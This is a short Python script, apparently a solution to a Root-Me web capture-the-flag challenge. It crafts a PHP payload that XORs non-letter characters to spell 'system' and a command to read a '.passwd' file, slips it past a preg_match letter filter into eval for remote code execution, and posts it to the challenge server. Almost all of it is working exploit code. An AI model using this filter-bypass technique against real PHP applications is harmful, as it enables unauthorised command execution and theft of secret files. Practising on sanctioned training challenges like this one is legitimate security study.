import requests
import string

# a^b=c && c^b=a || ^: 1-0=1 0-1=1 | 00 11 = 0
# input bypass preg_match() string letters PHP vào eval RCE

def get_valid_string(expected, valids):
	word1 = ""
	word2 = ""
	
	for i in expected:
		for j in valids:
			result = chr(ord(i) ^ ord(j))
			if result in valids:
				word1 += result
				word2 += j
				break
	return word1, word2

valids = ""
for i in string.printable:
	if i not in string.ascii_letters: # không lấy ascii letters(a-zA-Z)
		valids += i

valids = valids[:len(valids)-3]
expected = "system"
word1, word2 = get_valid_string(expected, valids)

expected_2 = "cat '.passwd'" # lưu ý tên file có dấu . ở đầu sẽ dính syntax error, cần string hóa tên file
word3, word4 = get_valid_string(expected_2, valids)

# PHP có thể dùng toán tử ^(OR) xử lý STRING
payload = "('{}'^'{}')(('{}'^'{}'))".format(word1, word2, word3, word4) # system(cat .passwd)

print(payload)

data = {'input':payload}

r = requests.post('http://challenge01.root-me.org/web-serveur/ch57/index.php', data=data)

print(r.text)